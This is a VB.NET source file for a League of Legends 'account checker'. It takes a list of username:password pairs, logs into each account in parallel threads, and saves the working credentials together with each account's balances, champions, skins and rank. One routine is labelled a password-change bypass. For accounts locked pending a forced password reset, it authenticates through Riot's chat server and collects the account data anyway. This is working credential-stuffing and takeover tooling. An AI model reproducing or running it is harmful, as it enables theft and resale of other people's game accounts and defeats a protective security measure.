Imports PVPNetClient
Imports Microsoft.Win32
Imports MahApps.Metro.Controls.Dialogs
Imports System.Threading
Imports PVPNetClient.RiotObjects.Platform
Imports System.Net
Imports agsXMPP
Imports agsXMPP.Xml.Dom
Imports Newtonsoft.Json.Linq

' Copyright 2016 BotOp Unreal LOL Account Checker
'
' This file is part of BotOp Unreal LOL Account Checker.
'
' BotOp Unreal LOL Account Checker is free software: you can redistribute it and/or modify 
' it under the terms of the GNU General Public License as published 
' by the Free Software Foundation, either version 3 of the License, or
' (at your option) any later version.
' 
' BotOp Unreal LOL Account Checker is distributed in the hope that it will be useful, but 
' WITHOUT ANY WARRANTY; without even the implied warranty of 
' MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. 
' See the GNU General Public License for more details.
' 
' You should have received a copy of the GNU General Public License 
' along with BotOp Unreal LOL Account Checker. If not, see http://www.gnu.org/licenses/.
Class MainWindow

#Region "Globals"
    Dim ImportedAccounts As New List(Of Imported_Data.Account)
    Public Shared currentthreads As Integer = 0
    Dim maxthreads As Integer = 0
    Public Shared homefolder As String
    Public Shared workingaccounts As Integer
    Public Shared checkedaccounts As Integer
    Public Shared pwbypass As Integer
    Public Shared timeout As Integer
    Public Shared outed As Integer
    Dim pause As Boolean = False
    Dim clientversion As String
    Public Shared dobypass As Boolean = False
#End Region
    
#Region "UI handling"
    Private Async Sub MetroWindow_Loaded(sender As Object, e As RoutedEventArgs)
        lbl1.Visibility = Windows.Visibility.Hidden
        lbl2.Visibility = Windows.Visibility.Hidden
        lbl3.Visibility = Windows.Visibility.Hidden
        regionbox.Items.Add(PVPNetClient.Region.EUNE)
        regionbox.Items.Add(PVPNetClient.Region.EUW)
        regionbox.Items.Add(PVPNetClient.Region.NA)
        regionbox.Items.Add(PVPNetClient.Region.OCE)
        regionbox.Items.Add(PVPNetClient.Region.PBE)
        regionbox.Items.Add(PVPNetClient.Region.LAS)
        regionbox.Items.Add(PVPNetClient.Region.LAN)
        regionbox.Items.Add(PVPNetClient.Region.BR)
        regionbox.Items.Add(PVPNetClient.Region.TR)
        regionbox.Items.Add(PVPNetClient.Region.RU)
        regionbox.SelectedIndex = 0
        Dim j As String = New System.Net.WebClient().DownloadString("https://global.api.pvp.net/api/lol/static-data/eune/v1.2/versions?api_key=" & My.Settings.apikey)
        txt_clientversion.Text = j.Split(""",").GetValue(1)
    End Sub
    Private Sub btn_about_Click(sender As Object, e As RoutedEventArgs) Handles btn_about.Click
        MsgBox("Botop Unreal Account Checker Coded By Saeed Suleiman" & vbNewLine & "Libs Used" & vbNewLine & "Mahapps Metro" & vbNewLine & "PVPNetClient" & vbNewLine & "rtmp-sharp")
    End Sub
    Private Async Sub btn_start_Click(sender As Object, e As RoutedEventArgs) Handles btn_start.Click
        If btn_start.Content = "Start" Then
           
            If Not ImportedAccounts.Count <= 0 Then
                workingaccounts = 0
                currentthreads = 0
                checkedaccounts = 0
                btn_importaccounts.IsEnabled = False
                btn_start.Content = "Pause"
                lbl1.Visibility = Windows.Visibility.Visible
                lbl2.Visibility = Windows.Visibility.Visible
                lbl3.Visibility = Windows.Visibility.Visible
                pause = False
                If chkpw.IsChecked Then dobypass = True
                timeout = timeoutupdown.Value
                clientversion = txt_clientversion.Text
                pbar.Maximum = ImportedAccounts.Count
                Dim reg As PVPNetClient.Region = DirectCast(regionbox.SelectedItem, PVPNetClient.Region)
                '  MsgBox(reg)
                Await ShowMessageAsync("Please Choose A Folder To Save This Project", "")
                Dim f As New System.Windows.Forms.FolderBrowserDialog
                If f.ShowDialog = Forms.DialogResult.OK Then
                    homefolder = f.SelectedPath & String.Format("\Botop Check {0}.{1}.{2}.{3}.{4}.{5}", Now.Year, Now.Month, Now.Day, Now.Hour, Now.Minute, Now.Second)
                    MkDir(homefolder)
                    maxthreads = threadupdown.Value - 1
                    Dim timer As New Thread(Sub()
                                                While True
                                                    Thread.Sleep(100)
                                                    If checkedaccounts >= ImportedAccounts.Count Then
                                                        Dispatcher.Invoke(Async Function()
                                                                              btn_start.Content = "Start"
                                                                              ImportedAccounts.Clear()

                                                                              pbar.Value = checkedaccounts
                                                                              pbar.Value = 0
                                                                              pbar.Maximum = 100
                                                                              lbl_prog.Content = pbar.Value & "/" & pbar.Maximum & " (" & Math.Round((pbar.Value / pbar.Maximum) * 100) & " %) " & workingaccounts & " Working Accounts " & pwbypass & " PWBypassed " & outed & " Timeouted Checks."
                                                                              btn_importaccounts.IsEnabled = True
                                                                              Await ShowMessageAsync("Checking Done", "Checking Done")
                                                                              Dim v As New viewer(homefolder & "\project.botop")
                                                                              v.ShowDialog()
                                                                          End Function)
                                                        Exit While
                                                    End If
                                                    Try
                                                        Dispatcher.Invoke(Sub()
                                                                              Try
                                                                                  lbl_threads.Content = currentthreads & " Threads Checking Accounts"
                                                                                  pbar.Value = checkedaccounts
                                                                                  lbl_prog.Content = pbar.Value & "/" & pbar.Maximum & " (" & Math.Round((pbar.Value / pbar.Maximum) * 100) & " %) " & workingaccounts & " Working Accounts " & pwbypass & " PWBypassed " & outed & " Timeouted Checks."
                                                                              Catch
                                                                              End Try
                                                                          End Sub)
                                                    Catch

                                                    End Try
                                                End While
                                            End Sub)
                    timer.Start()
                    Dim t As New Thread(Sub()
                                            For Each Account In ImportedAccounts
                                                While pause
                                                    Thread.Sleep(400)
                                                End While
                                                If currentthreads >= maxthreads Then
                                                    While currentthreads >= maxthreads
                                                        System.Threading.Thread.Sleep(100)
                                                    End While
                                                End If
                                                Dim tt As New Thread(Sub()
                                                                         Try
                                                                             Dim c As New Checker(Account, clientversion, reg)

                                                                         Catch ex As Exception
                                                                             checkedaccounts += 1
                                                                             '   MsgBox(ex.Message)
                                                                             '  MsgBox(ex.StackTrace)
                                                                         End Try
                                                                     End Sub)
                                                tt.Start()
                                                Thread.Sleep(100)
                                            Next

                                        End Sub)
                    t.Start()
                Else

                End If

            Else
                Await ShowMessageAsync("No Accounts Imported", "Please Import Some Accounts Before Starting")
            End If
        ElseIf btn_start.Content = "Continue" Then
            pause = False
            btn_start.Content = "Pause"
            lbl1.Visibility = Windows.Visibility.Hidden
            lbl2.Visibility = Windows.Visibility.Hidden
            lbl3.Visibility = Windows.Visibility.Hidden
        Else
            pause = True
            btn_start.Content = "Continue"
            lbl1.Visibility = Windows.Visibility.Visible
            lbl2.Visibility = Windows.Visibility.Visible
            lbl3.Visibility = Windows.Visibility.Visible

        End If

    End Sub

    Private Async Sub btn_importaccounts_Click(sender As Object, e As RoutedEventArgs) Handles btn_importaccounts.Click
        Dim o As New OpenFileDialog
        With o
            .Title = "Please Choose Your Accounts Textfile"
            .FileName = ""
            .Filter = "Text File|*.txt"
            If .ShowDialog = True Then
                Dim path As String = .FileName
                Parallel.ForEach(System.IO.File.ReadAllText(path).Split(New String() {Environment.NewLine},
                                      StringSplitOptions.None), Sub(i)
                                                                    Try
                                                                        Dim account As New Imported_Data.Account
                                                                        account.username = i.Split(":")(0)
                                                                        account.password = i.Split(":")(1)
                                                                        ImportedAccounts.Add(account)
                                                                    Catch

                                                                    End Try
                                                                End Sub)
                Await ShowMessageAsync("Accounts Imported", ImportedAccounts.Count & " Account Imported.")
            End If
        End With
    End Sub

    Private Sub btn_viewer_Click(sender As Object, e As RoutedEventArgs) Handles btn_viewer.Click
        Dim v As New viewer("")
        v.ShowDialog()
    End Sub

    Private Sub MetroWindow_Closed(sender As Object, e As EventArgs)
        End
    End Sub

    Private Sub btn_api_Click(sender As Object, e As RoutedEventArgs) Handles btn_api.Click
        Dim arg As String = "Please input your riot api key"

a:
        Dim key As String = InputBox("You can find your own api code by " & vbNewLine & "1) visiting developer.riotgames.com " & vbNewLine & "2) logging in with a dummy account" & vbNewLine & "3) agreeing on the terms of use or what ever" & vbNewLine & "4) copying your key , example (015541fc-d0e9-4824-a21a-da8324d5da32)" & vbNewLine & "5) Input it in the box below.", arg)
        If Not key = "" Then
            Try
                Dim a As String = New WebClient().DownloadString("https://global.api.pvp.net/api/lol/static-data/eune/v1.2/languages?api_key=" & key)
                My.Settings.apikey = key
                arg = "Please input your riot api key"
            Catch ex As Exception
                arg = "The key you inputed is invalid."
                GoTo a
            End Try
        Else

        End If
    End Sub
#End Region

    
    Private Async Sub btn_about_Copy_Click(sender As Object, e As RoutedEventArgs) Handles btn_about_Copy.Click
        My.Computer.Clipboard.SetText("16Xmx6UmPAySLSaMiDtyNYVFtqetKZnhmr")
        Await ShowMessageAsync("Copied", "Copied")

    End Sub
End Class


#Region "Checker"
Public Class Checker
    Dim connection As New PvpClient
    Dim acc_ As New Imported_Data.Account
    Public loginPacket As LoginDataPacket
    Dim regas As PVPNetClient.Region
    Dim stp As New Stopwatch
    Dim ts As New TimeSpan
    Sub New(ByVal acc As Imported_Data.Account, ByVal client As String, ByVal region As PVPNetClient.Region)
        Try
            stp.Start()
            acc_ = acc
            connection = New PVPNetClient.PvpClient(acc.username, acc.password, region, client)
            regas = region
            AddHandler connection.OnLogin, New PvpClient.OnLoginHandler(AddressOf OnLogin)
            AddHandler connection.OnError, New PvpClient.OnErrorHandler(AddressOf OnError)
            MainWindow.currentthreads += 1
            connection.ConnectAndLogin()
            Dim t As New Thread(Sub()
                                    ts = stp.Elapsed
                                    If ts.TotalSeconds >= MainWindow.timeout Then
                                        MainWindow.currentthreads -= 1
                                        MainWindow.checkedaccounts += 1
                                        MainWindow.outed += 1
                                        '  MsgBox("ouy")

b:
                                        Try
                                            System.IO.File.AppendAllText(MainWindow.homefolder & "\log.txt", acc_.username & ":" & acc_.password & " Error Timed Out")
                                        Catch ex As Exception
                                            Thread.Sleep(New Random().Next(100, 200))
                                            GoTo b
                                        End Try
                                    End If
                                    Thread.Sleep(100)
                                End Sub)
            t.Start()
        Catch ex As Exception
            ' MsgBox(ex.Message)
            MainWindow.currentthreads -= 1
            MainWindow.checkedaccounts += 1
            stp.Stop()
        End Try
    End Sub
    Function regiottoserver(r As PVPNetClient.Region)
        Dim rt As String
        Select Case r
            Case PVPNetClient.Region.EUNE
                rt = "eune"
            Case PVPNetClient.Region.EUW
                rt = "euw"
            Case PVPNetClient.Region.NA
                rt = "na"
            Case PVPNetClient.Region.OCE
                rt = "oce"
            Case PVPNetClient.Region.TR
                rt = "tr"
            Case PVPNetClient.Region.BR
                rt = "br"
            Case PVPNetClient.Region.RU
                rt = "ru"
            Case PVPNetClient.Region.PBE
                rt = "pbe"
            Case PVPNetClient.Region.LAS
                rt = "las"
            Case PVPNetClient.Region.LAN
                rt = "lan"
        End Select
        Return rt
    End Function

    Public Async Function OnError(ByVal sender As Object, ByVal [error] As PVPNetClient.Error) As Task
        If ([error].Message.Contains("Password Change")) And MainWindow.dobypass Then
            Await Bypass(acc_.username, acc_.password, regiottochat(regas), regiottoserver(regas))
        Else
            Try
b:
                System.IO.File.AppendAllText(MainWindow.homefolder & "\log.txt", acc_.username & ":" & acc_.password & " Error " & [error].Message & vbNewLine)
            Catch ex As Exception
                Thread.Sleep(New Random().Next(100, 200))
                GoTo b
            End Try
            MainWindow.currentthreads -= 1
            MainWindow.checkedaccounts += 1
        End If
        stp.Stop()

    End Function
    Public Async Function OnLogin(ByVal sender As Object, ByVal uusername As String) As Task
        Try
            loginPacket = Await connection.GetLoginDataPacketForUser
            If (loginPacket.AllSummonerData Is Nothing) Then
                MainWindow.currentthreads -= 1
                MainWindow.checkedaccounts += 1
                Exit Function
            End If
            Dim Account As New CheckingData.Account
            Account.Username = acc_.username
            Account.Password = acc_.password
            Account.LastLogin = loginPacket.AllSummonerData.Summoner.LastGameDate
            Account.RP = loginPacket.RpBalance
            Account.IP = loginPacket.IpBalance

            Account.SummonerName = loginPacket.AllSummonerData.Summoner.Name
            Account.Level = loginPacket.AllSummonerData.SummonerLevel.Level
            Account.SummonerID = loginPacket.AllSummonerData.SummonerDefaultSpells.SummonerId
            Dim champions = Await connection.GetAvailableChampions
            Dim rankk As String

            If Account.Level = 30 Then
                Dim step2 As String = New WebClient().DownloadString("https://" & regiottoserver(regas) & ".api.pvp.net/api/lol/" & regiottoserver(regas) & "/v2.5/league/by-summoner/" & Account.SummonerID & "/entry?api_key=" & My.Settings.apikey)

                Dim jj = Newtonsoft.Json.Linq.JObject.Parse(step2)
                Dim tier As Newtonsoft.Json.Linq.JToken = jj(Account.SummonerID)(0)("tier")
                Dim div As Newtonsoft.Json.Linq.JToken = jj(Account.SummonerID)(0)("entries")(0)("division")
                Dim lp As Newtonsoft.Json.Linq.JToken = jj(Account.SummonerID)(0)("entries")(0)("leaguePoints")
                rankk = (tier.ToString & " " & div.ToString & " (" & lp.ToString & ") LP")
            Else
                rankk = " "
            End If

            Account.Rank = rankk
            For Each champ In champions
                If champ.Owned Then
                    Dim cp As New CheckingData.Champion
                    cp.id = champ.ChampionId
                    cp.name = champ.DisplayName
                    cp.PurchaseDate = champ.PurchaseDate
                    Account.Champions.Add(cp)
                    Account.ChampionCount += 1
                    For Each skin As ChampionSkinDTO In champ.ChampionSkins
                        If skin.Owned Then
                            Dim sk As New CheckingData.Skin
                            sk.id = skin.SkinId
                            sk.championid = skin.ChampionId
                            sk.PurchaseDate = skin.PurchaseDate
                            Account.Skins.Add(sk)
                            Account.SkinCount += 1
                        End If
                    Next
                End If
            Next


            Dim Str As String
            Dim email As String
            If (Not loginPacket.EmailStatus Is Nothing) Then
                Str = loginPacket.EmailStatus.Replace("_"c, " "c)
                email = (Char.ToUpper(Str.Chars(0)) & Str.Substring(1))
            Else
                email = "Unknown"
            End If
            Account.Email = email
            ' connection.Disconnect()
            Try
B:
                System.IO.File.WriteAllText(MainWindow.homefolder & "\acc_" & Account.SummonerID, New Web.Script.Serialization.JavaScriptSerializer().Serialize(Account))
            Catch ex As Exception
                ' MsgBox(ex.Message)
                Thread.Sleep(New Random().Next(1, 100))
                GoTo b
            End Try
            Try
a:
                System.IO.File.AppendAllText(MainWindow.homefolder & "\project.botop", "acc_" & Account.SummonerID & vbNewLine)
            Catch ex As Exception
                '  MsgBox(ex.Message)
                Thread.Sleep(New Random().Next(1, 100))
                GoTo a
            End Try
            stp.Stop()
            MainWindow.workingaccounts += 1
        Catch ex As Exception
            stp.Stop()    
        End Try
        MainWindow.currentthreads -= 1
        MainWindow.checkedaccounts += 1

    End Function
    Function regiottochat(r As Region)
        Dim rt As String
        Select Case r
            Case PVPNetClient.Region.EUNE
                rt = "eun1"
            Case PVPNetClient.Region.EUW
                rt = "euw1"
            Case PVPNetClient.Region.NA
                rt = "na1"
            Case PVPNetClient.Region.OCE
                rt = "oc1"
            Case PVPNetClient.Region.TR
                rt = "tr"
            Case PVPNetClient.Region.BR
                rt = "br"
            Case PVPNetClient.Region.RU
                rt = "ru"
            Case PVPNetClient.Region.PBE
                rt = "pbe1"
            Case PVPNetClient.Region.LAS
                rt = "la2"
            Case PVPNetClient.Region.LAN
                rt = "la1"
        End Select
        Return rt
    End Function
    Async Function Bypass(user As String, pass As String, region As String, r As String) As Task
        Try
            Dim id As String = Await GetSummonerId(user, pass, region)
            Await getinfo(id, user, pass, r)
        Catch ex As Exception
            Try
b:
                System.IO.File.AppendAllText(MainWindow.homefolder & "\log.txt", acc_.username & ":" & acc_.password & " Error While Bypassing PWChange (" & ex.Message & ")" & vbNewLine)
            Catch
                Thread.Sleep(New Random().Next(100, 200))
                GoTo b
            End Try
        End Try
        MainWindow.checkedaccounts += 1
        MainWindow.currentthreads -= 1
    End Function
    Public Function GetSummonerId(user As String, pass As String, region As String) As Task(Of String)
        Dim tsc As TaskCompletionSource(Of String) = New TaskCompletionSource(Of String)()
        Dim xmpp As XmppClientConnection = New XmppClientConnection(String.Format("chat.{0}.lol.riotgames.com", region), 5223) With {.UseSSL = True, .Resource = "xiff", .AutoRoster = False, .AutoPresence = False}
        xmpp.Open(user, "AIR_" + pass)
        xmpp.Server = "pvp.net"


        AddHandler xmpp.OnBinded, Sub(sender As Object)
                                      tsc.SetResult(xmpp.MyJID.User.Substring(3))
                                      xmpp.Close()
                                  End Sub
        AddHandler xmpp.OnAuthError, Sub(sender As Object, element As Element)
                                         tsc.SetException(New Exception("InvalidCredentials/NoSummoner"))
                                         xmpp.Close()
                                     End Sub
        AddHandler xmpp.OnBindError, Sub(sender As Object, element As Element)
                                         tsc.SetException(New Exception("Internal Error"))
                                         xmpp.Close()


                                     End Sub
        AddHandler xmpp.OnSocketError, Sub(sender As Object, exception As Exception)
                                           tsc.SetException(New Exception("Connection Error"))
                                           xmpp.Close()


                                       End Sub
        AddHandler xmpp.OnError, Sub(sender As Object, exception As Exception)
                                     tsc.SetException(New Exception("Internal Error"))

                                     xmpp.Close()


                                 End Sub
        AddHandler xmpp.OnStreamError, Sub(sender As Object, element As Element)
                                           tsc.SetException(New Exception("Internal Error"))
                                           xmpp.Close()


                                       End Sub

        Return tsc.Task
    End Function
    Function getinfo(sid As String, user As String, pass As String, reserver As String) As Task(Of Boolean)


        Try
a:
            Dim Account As New CheckingData.Account
            Dim tsc As TaskCompletionSource(Of Boolean) = New TaskCompletionSource(Of Boolean)()
            Try
                Dim step1 As String = New WebClient().DownloadString("https://" & reserver & ".api.pvp.net/api/lol/" & reserver & "/v1.4/summoner/" & sid & "?api_key=" & My.Settings.apikey)

                Dim j = Newtonsoft.Json.Linq.JObject.Parse(step1)
                Dim lastlogin As JToken = j(sid)("revisionDate")
                Account.Username = user
                '  Dim rank As JToken = jj(sid)("tier")
                '(rank)
                Dim name As String = step1.Split(",""name"":""").GetValue(1)
                name = name.Split(":").GetValue(1)
                name = name.Substring(1, name.Length - 2)
                Dim level As String = step1.Split("""summonerLevel"": ").GetValue(12)
                level = level.Substring(1, level.Length - 2)
                Account.Password = (pass)
                Account.SummonerName = (name)
                Try
                    Dim step2 As String = New WebClient().DownloadString("https://" & reserver & ".api.pvp.net/api/lol/" & reserver & "/v2.5/league/by-summoner/" & sid & "/entry?api_key=" & My.Settings.apikey)

                    Dim jj = Newtonsoft.Json.Linq.JObject.Parse(step2)
                    Dim tier As Newtonsoft.Json.Linq.JToken = jj(sid)(0)("tier")
                    Dim div As Newtonsoft.Json.Linq.JToken = jj(sid)(0)("entries")(0)("division")
                    Dim lp As Newtonsoft.Json.Linq.JToken = jj(sid)(0)("entries")(0)("leaguePoints")
                    Account.Level = (level & " " & tier.ToString & " " & div.ToString & " (" & lp.ToString & ") LP")
                Catch
                    If level = 30 Then
                        Account.Level = (level & " (Unranked)")

                    Else
                        Account.Level = (level)

                    End If

                End Try
                Account.SummonerID = (sid)
                Account.LastLogin = (UnixTimeStampToDateTime(lastlogin).ToLocalTime)
                Account.Email = "PWBypassed"
                Try
z:
                    System.IO.File.WriteAllText(MainWindow.homefolder & "\byacc_" & Account.SummonerID, New Web.Script.Serialization.JavaScriptSerializer().Serialize(Account))
                Catch

                    Thread.Sleep(New Random().Next(1, 100))
                    GoTo z
                End Try
                Try
x:
                    System.IO.File.AppendAllText(MainWindow.homefolder & "\project.botop", "byacc_" & Account.SummonerID & vbNewLine)
                Catch
                    Thread.Sleep(New Random().Next(1, 100))
                    GoTo x
                End Try
                MainWindow.pwbypass += 1
                stp.Stop()
            Catch ex As Exception
                If ex.Message.Contains("429") Then
                    System.Threading.Thread.Sleep(2000)
                    GoTo a
                Else
                    If ex.Message.Contains("403") Then
                        System.Threading.Thread.Sleep(2000)
                        GoTo a
                    End If
                    If ex.Message.Contains("500") Then
                        System.Threading.Thread.Sleep(2000)
                        GoTo a
                    End If
                    If ex.Message.Contains("503") Then
                        System.Threading.Thread.Sleep(2000)
                        GoTo a
                    End If
                End If
                stp.Stop()
            End Try
        Catch hhhh As Exception
            stp.Stop()
        End Try
        MainWindow.checkedaccounts += 1
        MainWindow.currentthreads -= 1
    End Function
    
    Public Function UnixTimeStampToDateTime(unixTimeStamp As Double) As DateTime
        Dim result As DateTime = New DateTime(1970, 1, 1, 0, 0, 0, 0, DateTimeKind.Utc)
        result = result.AddSeconds(Math.Round(unixTimeStamp / 1000.0)).ToLocalTime()
        Return result
    End Function
End Class
#End Region

#Region "Custom Classes"
Namespace Imported_Data
    Public Class Account
        Property username As String
        Property password As String

    End Class
End Namespace
Namespace CheckingData
    Public Class Account
        Property Username As String
        Property SummonerID As String
        Property Password As String
        Property SummonerName As String
        Property Level As Integer
        Property Rank As String
        Property IP As String
        Property RP As String
        Property Email As String
        Property LastLogin As Date
        Property ChampionCount As Integer
        Property SkinCount As Integer
        Property Champions As New List(Of Champion)
        Property Skins As New List(Of Skin)

    End Class
    Public Class Champion
        Property id As Integer
        Property name As String
        Property PurchaseDate As Double

    End Class
    Public Class Skin
        Property id As Integer
        Property championid As Integer
        Property name As String
        Property PurchaseDate As Double

    End Class
End Namespace
#End Region
